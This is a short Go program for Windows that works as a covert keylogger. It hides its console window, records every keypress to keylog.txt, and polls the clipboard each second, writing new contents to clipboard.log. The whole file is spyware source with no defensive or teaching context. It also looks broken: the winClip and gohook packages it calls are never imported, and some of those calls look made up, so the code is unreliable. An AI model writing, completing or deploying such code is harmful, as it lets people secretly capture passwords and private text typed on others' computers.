package main

import (
	"fmt"
	"os"
	"path/filepath"
	"time"

	"golang.org/x/sys/windows"
)

func hideConsole() {
	handle := windows.GetConsoleWindow()
	if handle != 0 {
		windows.ShowWindow(handle, windows.SW_HIDE)
	}
}

func getLogDir() string {
	exePath, _ := os.Executable()
	return filepath.Dir(exePath)
}

func logToFile(filePath, text string) {
	file, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Error writing log: %v\n", err)
		return
	}
	defer file.Close()
	file.WriteString(text)
}

func captureClipboard(logDir string) {
	var lastContent string
	filePath := filepath.Join(logDir, "clipboard.log")

	for {
		winClip.OpenClipboard()
		data, err := winClip.GetClipboardData(winClip.CF_TEXT)
		if err == nil && string(data) != lastContent {
			logToFile(filePath, fmt.Sprintf("[CLIPBOARD] %s\n", string(data)))
			lastContent = string(data)
		}
		winClip.CloseClipboard()
		time.Sleep(time.Second)
	}
}

func main() {
	hideConsole()
	logDir := getLogDir()
	filePath := filepath.Join(logDir, "keylog.txt")

	go captureClipboard(logDir)

	hook := gohook.NewHook()
	hook.OnEvent(func(e interface{}) {
		if key, ok := e.(gohook.KeyEvent); ok {
			if key.Kind == gohook.KeyPress {
				if key.Char != 0 {
					logToFile(filePath, string(rune(key.Char)))
				} else {
					logToFile(filePath, fmt.Sprintf("[%s]\n", key.Name))
				}
			}
		}
	})

	hook.Start()
	defer hook.Stop()
	select {}
}
